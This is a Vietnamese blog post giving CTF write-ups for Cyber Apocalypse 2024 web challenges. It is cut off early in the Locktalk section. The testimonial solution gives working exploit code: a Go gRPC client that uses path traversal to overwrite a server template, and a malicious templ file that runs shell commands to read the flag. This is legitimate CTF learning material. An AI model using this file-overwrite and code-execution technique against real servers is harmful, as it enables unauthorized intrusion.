<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <meta name="generator" content="VuePress 2.0.0-rc.18">
    <script>
      (function() {
        const userMode = localStorage.getItem('vuepress-reco-color-scheme') || 'auto';
        const systemDarkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;

        if (userMode === 'dark' || (userMode === 'auto' && systemDarkMode)) {
          document.documentElement.classList.toggle('dark', true);
        }
      })();
    </script>
    <link rel="icon" href="/alimi.ico"><title>Cyber Apocalypse CTF 2024 | d0qbu's blog</title><meta name="description" content="d0qbu's blog to share something I knew">
    <link rel="preload" href="/assets/style-CLjLGmBa.css" as="style"><link rel="stylesheet" href="/assets/style-CLjLGmBa.css">
    <link rel="modulepreload" href="/assets/app-BJjiZhLy.js"><link rel="modulepreload" href="/assets/cyber-apocalypse-2024.html-BFTdxU_i.js">
    <link rel="prefetch" href="/assets/timeline.html-Dxk7sbyB.js" as="script"><link rel="prefetch" href="/assets/posts.html-svjq6049.js" as="script"><link rel="prefetch" href="/assets/friendship-link.html-DnusWWj3.js" as="script"><link rel="prefetch" href="/assets/1.html-D0ekpFwU.js" as="script"><link rel="prefetch" href="/assets/1.html-D-VJtKmR.js" as="script"><link rel="prefetch" href="/assets/1.html-DtlQzd4D.js" as="script"><link rel="prefetch" href="/assets/1.html-DxyjHmfe.js" as="script"><link rel="prefetch" href="/assets/1.html-mEFscRrH.js" as="script"><link rel="prefetch" href="/assets/1.html-K0Og4IjV.js" as="script"><link rel="prefetch" href="/assets/1.html-C56FgLwa.js" as="script"><link rel="prefetch" href="/assets/1.html-TWxB8BbY.js" as="script"><link rel="prefetch" href="/assets/1.html-gldDPc-a.js" as="script"><link rel="prefetch" href="/assets/1.html-CuKlQTZu.js" as="script"><link rel="prefetch" href="/assets/1.html-dCabBEr6.js" as="script"><link rel="prefetch" href="/assets/1.html-BzoJhmkV.js" as="script"><link rel="prefetch" href="/assets/1.html-3Zc5XUkc.js" as="script"><link rel="prefetch" href="/assets/index.html-XHz8wPa0.js" as="script"><link rel="prefetch" href="/assets/wannagame-freshman-2023.html-CsRvqhSO.js" as="script"><link rel="prefetch" href="/assets/CVE-2024-44902.html-T8TPcMVJ.js" as="script"><link rel="prefetch" href="/assets/greycatctf-2024.html-Bmf_YGFB.js" as="script"><link rel="prefetch" href="/assets/mysql-tcp.html--H7-qYyh.js" as="script"><link rel="prefetch" href="/assets/picoctf-2024.html-DUXLUr9W.js" as="script"><link rel="prefetch" href="/assets/prototype-pollution-bios.html-QPgq_n3y.js" as="script"><link rel="prefetch" href="/assets/404.html-C9_lKTdL.js" as="script"><link rel="prefetch" href="/assets/Valine.min-BDHOk_jE.js" as="script"><link rel="prefetch" href="/assets/giscus-aTimukGI-CpBH_6Jv.js" as="script"><link rel="prefetch" href="/assets/setupDevtools-7MC2TMWH-s98YujfD.js" as="script">
  </head>
  <body>
    <div id="app"><!--[--><div class="theme-container series--no show-catalog"><header class="navbar-container not-open"><div class="navbar-inner"><div class="site-brand nav-item"><!----><a href="/" class="site-name">d0qbu&#39;s blog</a></div><div class="nav-item navbar-links-wrapper" style=""><div><form class="search-box" role="search"><input type="search" autocomplete="off" spellcheck="false" value><!----></form></div><nav class="navbar-links"><!--[--><div class="navbar-links__item"><a href="/" class="link" aria-label="Home"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Home<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/timeline.html" class="link" aria-label="Timeline"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Timeline<!--]--></span></span><!--[--><!--]--></a></div><div class="navbar-links__item"><a href="/categories/CTF/1.html" class="link" aria-label="Categories"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->Categories<!--]--></span></span><!--[--><!--]--></a></div><!--]--><!----><span class="xicon-container btn-toggle-dark-mode btn--dark-mode navbar-links__item"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:;"><path d="M13.502 5.414a15.075 15.075 0 0 0 11.594 18.194a11.113 11.113 0 0 1-7.975 3.39c-.138 0-.278.005-.418 0a11.094 11.094 0 0 1-3.2-21.584M14.98 3a1.002 1.002 0 0 0-.175.016a13.096 13.096 0 0 0 1.825 25.981c.164.006.328 0 .49 0a13.072 13.072 0 0 0 10.703-5.555a1.01 1.01 0 0 0-.783-1.565A13.08 13.08 0 0 1 15.89 4.38A1.015 1.015 0 0 0 14.98 3z" fill="currentColor"></path></svg></span><ul class="social-links navbar-links__item"><!--[--><li class="social-item"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:25px;height:25px;"><path d="M16 2a14 14 0 0 0-4.43 27.28c.7.13 1-.3 1-.67v-2.38c-3.89.84-4.71-1.88-4.71-1.88a3.71 3.71 0 0 0-1.62-2.05c-1.27-.86.1-.85.1-.85a2.94 2.94 0 0 1 2.14 1.45a3 3 0 0 0 4.08 1.16a2.93 2.93 0 0 1 .88-1.87c-3.1-.36-6.37-1.56-6.37-6.92a5.4 5.4 0 0 1 1.44-3.76a5 5 0 0 1 .14-3.7s1.17-.38 3.85 1.43a13.3 13.3 0 0 1 7 0c2.67-1.81 3.84-1.43 3.84-1.43a5 5 0 0 1 .14 3.7a5.4 5.4 0 0 1 1.44 3.76c0 5.38-3.27 6.56-6.39 6.91a3.33 3.33 0 0 1 .95 2.59v3.84c0 .46.25.81 1 .67A14 14 0 0 0 16 2z" fill-rule="evenodd" fill="currentColor"></path></svg></li><!--]--></ul></nav><span class="xicon-container btn-toggle-menus"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" style="width:20px;height:20px;font-size:20px;color:;"><circle cx="16" cy="8" r="2" fill="currentColor"></circle><circle cx="16" cy="16" r="2" fill="currentColor"></circle><circle cx="16" cy="24" r="2" fill="currentColor"></circle></svg></span></div></div></header><!----><!----><!----><div class="theme-main" style=""><!----><!--[--><main class="page-container"><div class="page-content"><h1 class="page-title">Cyber Apocalypse CTF 2024</h1><div class="page-info"><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M16 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M26 30h-2v-5a5 5 0 0 0-5-5h-6a5 5 0 0 0-5 5v5H6v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->d0qbu<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[-->2024-03-20<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M11.17 6l3.42 3.41l.58.59H28v16H4V6h7.17m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2H16l-3.41-3.41A2 2 0 0 0 11.17 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[--><!--[--><a href="/categories/CTF/1.html" class="">CTF</a><!--]--><!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewbox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:;"><path d="M10 14a4 4 0 1 1 4-4a4.005 4.005 0 0 1-4 4zm0-6a2 2 0 1 0 1.998 2.004A2.002 2.002 0 0 0 10 8z" fill="currentColor"></path><path d="M16.644 29.415L2.586 15.354A2 2 0 0 1 2 13.941V4a2 2 0 0 1 2-2h9.941a2 2 0 0 1 1.414.586l14.06 14.058a2 2 0 0 1 0 2.828l-9.943 9.943a2 2 0 0 1-2.829 0zM4 4v9.942L18.058 28L28 18.058L13.942 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:;font-size:14px;"><!--[--><!--[--><a href="/tags/JWT/1.html" class="">JWT</a><a href="/tags/Pathtraversal/1.html" class="">Pathtraversal</a><!--]--><!--]--></span></span><!----></div><div class="theme-reco-md-content"><div><h2 id="web-testimonial" tabindex="-1"><a class="header-anchor" href="#web-testimonial"><span>WEB: testimonial</span></a></h2><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>As the leader of the Revivalists you are determined to take down the KORP, you and the best of your faction&#39;s hackers have set out to deface the official KORP website to send them a message that the revolution is closing in.</p><p><a href="https://uithcm-my.sharepoint.com/:u:/g/personal/23520385_ms_uit_edu_vn/ERI23X926BlGnfBSuAzRm3cBpgayVeZHktM_NKip2LdEaA?e=3SujLE" target="_blank" rel="noopener noreferrer"><code>üìÅ testimonial.zip</code><span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></div><ul><li>B√†i cho ch√∫ng ta web ƒë∆°n gi·∫£n, cho ph√©p l∆∞u c√°c note v√†o folder c·ªßa server. <img src="/assets/cyber-apocalypse-2024-DuYV85g7.png" alt="image"></li><li>File flag n·∫±m ·ªü <code>/</code> v√† ƒë∆∞·ª£c ƒë·∫∑t t√™n random</li></ul><div class="language-bash line-numbers-mode" data-highlighter="prismjs" data-ext="sh" data-title="sh"><pre><code><span class="line"><span class="token comment"># Change flag name</span></span>
<span class="line"><span class="token function">mv</span> /flag.txt /flag<span class="token variable"><span class="token variable">$(</span><span class="token function">cat</span> /dev/urandom <span class="token operator">|</span> <span class="token function">tr</span> <span class="token parameter variable">-cd</span> <span class="token string">&quot;a-f0-9&quot;</span> <span class="token operator">|</span> <span class="token function">head</span> <span class="token parameter variable">-c</span> <span class="token number">10</span><span class="token variable">)</span></span>.txt</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>Server s·ª≠ d·ª•ng gRPC ƒë·ªÉ x·ª≠ l√Ω logic</li><li>Code ƒë∆∞·ª£c ch·∫°y v·ªõi <code>Air</code> - live reload for Go apps. C·ª• th·ªÉ h∆°n ƒë·ªëi v·ªõi app n√†y l√† t·ª± reload c√°c file &quot;tpl&quot;, &quot;tmpl&quot;, &quot;templ&quot;, &quot;html&quot;</li></ul><p>Khi submit m·ªôt note m·ªõi, 2 params ƒë∆∞·ª£c truy·ªÅn v√†o l√† <code>customer</code> v√† <code>testimonial</code>. V·ªõi <code>customer</code> l√† t√™n file ƒë∆∞·ª£c l∆∞u v√†o <code>public/testimonials/</code> v√† <code>testimonial</code> l√† n·ªôi dung file.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line">func <span class="token function">HandleHomeIndex</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> error <span class="token punctuation">{</span></span>
<span class="line">    <span class="token literal-property property">customer</span> <span class="token operator">:</span><span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;customer&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token literal-property property">testimonial</span> <span class="token operator">:</span><span class="token operator">=</span> r<span class="token punctuation">.</span><span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">&quot;testimonial&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    </span>
<span class="line">    <span class="token operator">...</span></span>
<span class="line"></span>
<span class="line">    <span class="token keyword">if</span> <span class="token literal-property property">err</span> <span class="token operator">:</span><span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">SendTestimonial</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> testimonial<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> nil <span class="token punctuation">{</span></span>
<span class="line">        http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> err<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">)</span></span>
<span class="line">	<span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line">    <span class="token operator">...</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Hai param ƒë∆∞·ª£c truy·ªÅn v√†o h√†m <code>SendTestimonial</code>. Th√¥ng qua h√†m n√†y, t√™n file ƒë√£ b·ªã filter v√† lo·∫°i b·ªè t·∫•t c·∫£ c√°c k√≠ t·ª± c√≥ h·∫°i --&gt; Kh√¥ng th·ªÉ pathtraversal ƒë·ªÉ ghi ƒë√® file ƒë∆∞·ª£c.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token function">func</span> <span class="token punctuation">(</span>c <span class="token operator">*</span>Client<span class="token punctuation">)</span> <span class="token function">SendTestimonial</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> testimonial string<span class="token punctuation">)</span> error <span class="token punctuation">{</span></span>
<span class="line">    <span class="token operator">...</span></span>
<span class="line">    <span class="token keyword">for</span> _<span class="token punctuation">,</span> <span class="token literal-property property">char</span> <span class="token operator">:</span><span class="token operator">=</span> range <span class="token punctuation">[</span><span class="token punctuation">]</span>string<span class="token punctuation">{</span><span class="token string">&quot;/&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\\&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;:&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;*&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;?&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;\&quot;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&lt;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;&gt;&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;|&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;.&quot;</span><span class="token punctuation">}</span> <span class="token punctuation">{</span></span>
<span class="line">        customer <span class="token operator">=</span> strings<span class="token punctuation">.</span><span class="token function">ReplaceAll</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> char<span class="token punctuation">,</span> <span class="token string">&quot;&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    _<span class="token punctuation">,</span> <span class="token literal-property property">err</span> <span class="token operator">:</span><span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">SubmitTestimonial</span><span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> <span class="token operator">&amp;</span>pb<span class="token punctuation">.</span>TestimonialSubmission<span class="token punctuation">{</span><span class="token literal-property property">Customer</span><span class="token operator">:</span> customer<span class="token punctuation">,</span> <span class="token literal-property property">Testimonial</span><span class="token operator">:</span> testimonial<span class="token punctuation">}</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token operator">...</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>Tuy nhi√™n, ƒë√≥ ch·ªâ l√† nh·ªØng ƒëo·∫°n code ƒë·ªÉ x·ª≠ l√Ω ·ªü ph√≠a client. ƒêo·∫°n code x·ª≠ l√Ω ch√≠nh c·ªßa server v·ªõi gRPC l·∫°i kh√¥ng c√≥ b·∫•t k√¨ bi·ªán ph√°p ph√≤ng ch·ªëng n√†o.</p><div class="language-javascript line-numbers-mode" data-highlighter="prismjs" data-ext="js" data-title="js"><pre><code><span class="line"><span class="token function">func</span> <span class="token punctuation">(</span>s <span class="token operator">*</span>server<span class="token punctuation">)</span> <span class="token function">SubmitTestimonial</span><span class="token punctuation">(</span>ctx context<span class="token punctuation">.</span>Context<span class="token punctuation">,</span> req <span class="token operator">*</span>pb<span class="token punctuation">.</span>TestimonialSubmission<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token operator">*</span>pb<span class="token punctuation">.</span>GenericReply<span class="token punctuation">,</span> error<span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token operator">...</span></span>
<span class="line">    <span class="token literal-property property">err</span> <span class="token operator">:</span><span class="token operator">=</span> os<span class="token punctuation">.</span><span class="token function">WriteFile</span><span class="token punctuation">(</span>fmt<span class="token punctuation">.</span><span class="token function">Sprintf</span><span class="token punctuation">(</span><span class="token string">&quot;public/testimonials/%s&quot;</span><span class="token punctuation">,</span> req<span class="token punctuation">.</span>Customer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>Testimonial<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0644</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token operator">...</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>C√≥ th·ªÉ th·∫•y, code format <code>req.Customer</code> v√† write file m√† kh√¥ng h·ªÅ ki·ªÉm tra c√°c k√≠ t·ª± x·∫•u. N·∫øu ta c√≥ th·ªÉ g·ªçi th·∫≥ng ƒë·∫øn gRPC server m√† kh√¥ng c·∫ßn th√¥ng qua c√°c b∆∞·ªõc x·ª≠ l√Ω r∆∞·ªùm r√† th√¨ c√≥ th·ªÉ write file m·ªõi, hay ghi ƒë√® file c≈© m·ªôt c√°ch d·ªÖ d√†ng.</p><p>Nh∆∞ v·∫≠y, h∆∞·ªõng ƒëi l√† t·∫°o m·ªôt gRPC client m·ªõi, connect ƒë·∫øn gRPC server v√† SubmitTestimonial, ghi ƒë√® file <code>view/home/index.templ</code>, khi file b·ªã thay ƒë·ªïi, app c≈©ng s·∫Ω reload ƒë·ªÉ c·∫≠p nh·∫≠t n·ªôi d·ª•ng m·ªõi c·ªßa file.</p><p>T·∫°o file <code>index.tmpl</code> m·ªõi thay th·∫ø cho n·ªôi dung file c≈© ƒë·ªÉ ƒë·ªçc flag</p><details class="custom-container details"><summary class="custom-container-title">index.tmpl</summary><div class="language-templ line-numbers-mode" data-highlighter="prismjs" data-ext="templ" data-title="templ"><pre><code><span class="line">package home</span>
<span class="line"></span>
<span class="line">import (</span>
<span class="line">    &quot;fmt&quot;</span>
<span class="line">    &quot;os/exec&quot;</span>
<span class="line">)</span>
<span class="line"></span>
<span class="line">func getFlag() string {</span>
<span class="line">    cmd := exec.Command(&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;cat /flag*.txt&quot;)</span>
<span class="line">    out, err := cmd.Output()</span>
<span class="line">    if err != nil {</span>
<span class="line">        return &quot;Error&quot;</span>
<span class="line">    }</span>
<span class="line">    return string(out)</span>
<span class="line">}</span>
<span class="line"></span>
<span class="line">templ Index() {</span>
<span class="line">    {getFlag()}</span>
<span class="line">}</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>T·∫°o gRPC client, submit testimonial ƒë·ªÉ ghi ƒë√® file c√≥ s·∫µn v·ªõi pathtraversal, m√¨nh d·ª±a v√†o src g·ªëc ƒë·ªÉ t·∫°o gRPC client</p><details class="custom-container details"><summary class="custom-container-title">solve.go</summary><div class="language-go line-numbers-mode" data-highlighter="prismjs" data-ext="go" data-title="go"><pre><code><span class="line"><span class="token keyword">package</span> main</span>
<span class="line"></span>
<span class="line"><span class="token keyword">import</span> <span class="token punctuation">(</span></span>
<span class="line">    <span class="token string">&quot;fmt&quot;</span></span>
<span class="line">    <span class="token string">&quot;htbchal/client&quot;</span></span>
<span class="line">    <span class="token string">&quot;log&quot;</span></span>
<span class="line">    <span class="token string">&quot;os&quot;</span></span>
<span class="line"><span class="token punctuation">)</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">func</span> <span class="token function">HandleHomeIndex</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> testimonial <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    <span class="token keyword">if</span> customer <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span> <span class="token operator">&amp;&amp;</span> testimonial <span class="token operator">!=</span> <span class="token string">&quot;&quot;</span> <span class="token punctuation">{</span></span>
<span class="line">        c<span class="token punctuation">,</span> err <span class="token operator">:=</span> client<span class="token punctuation">.</span><span class="token function">GetClient</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span>
<span class="line">        <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span></span>
<span class="line">            log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">&quot;Error getting client: %v&quot;</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">        <span class="token keyword">if</span> err <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">SendTestimonial</span><span class="token punctuation">(</span>customer<span class="token punctuation">,</span> testimonial<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span></span>
<span class="line">            log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">&quot;Error sending testimonial: %v&quot;</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span></span>
<span class="line">        <span class="token punctuation">}</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span></span>
<span class="line">    dat<span class="token punctuation">,</span> err <span class="token operator">:=</span> os<span class="token punctuation">.</span><span class="token function">ReadFile</span><span class="token punctuation">(</span><span class="token string">&quot;newhome.templ&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">{</span></span>
<span class="line">        log<span class="token punctuation">.</span><span class="token function">Fatalf</span><span class="token punctuation">(</span><span class="token string">&quot;Error reading file: %v&quot;</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span></span>
<span class="line">    <span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line">    fmt<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">&quot;Submitting testimonial...&quot;</span><span class="token punctuation">)</span></span>
<span class="line">    <span class="token function">HandleHomeIndex</span><span class="token punctuation">(</span><span class="token string">&quot;../../view/home/index.templ&quot;</span><span class="token punctuation">,</span> <span class="token function">string</span><span class="token punctuation">(</span>dat<span class="token punctuation">)</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token punctuation">}</span></span>
<span class="line"></span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div></details><p>Ch·ªâ c·∫ßn ch·∫°y file <code>solve.go</code> ƒë·ªÉ submit testimonial l√™n cho server, sau ƒë√≥ reload l·∫°i trang v√† l·∫•y flag</p><h2 id="web-locktalk" tabindex="-1"><a class="header-anchor" href="#web-locktalk"><span>WEB: Locktalk</span></a></h2><div class="custom-container info"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">Challenge</p><p>In &quot;The Ransomware Dystopia,&quot; LockTalk ...(sh1t)... against the encroaching darkness.</p><p><a href="https://uithcm-my.sharepoint.com/:u:/g/personal/23520385_ms_uit_edu_vn/EfSRFaWRkXhMqhSZrQQYtnEBA3tblkQuYSktpQsAY1dH8Q?e=eaFMJk" target="_blank" rel="noopener noreferrer"><code>üìÅ web_locktalk.zip</code><span><svg class="external-link-icon" xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path><polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg><span class="external-link-icon-sr-only">open in new window</span></span></a></p></div><ul><li>App cho 3 API Endpoints <img src="/assets/cyber-apocalypse-2024-1-6LEOrW37.png" alt="image"> C√≥ hai endpoint quan tr·ªçng l√† <code>get_ticket</code> ƒë·ªÉ l·∫•y jwt token v√† <code>flag</code> ƒë·ªÉ l·∫•y flag d·ª±a v√†o jwt token.</li></ul><div class="language-python line-numbers-mode" data-highlighter="prismjs" data-ext="py" data-title="py"><pre><code><span class="line"><span class="token decorator annotation punctuation">@api_blueprint<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">&#39;/get_ticket&#39;</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&#39;GET&#39;</span><span class="token punctuation">]</span><span class="token punctuation">)</span></span>
<span class="line"><span class="token keyword">def</span> <span class="token function">get_ticket</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span></span>
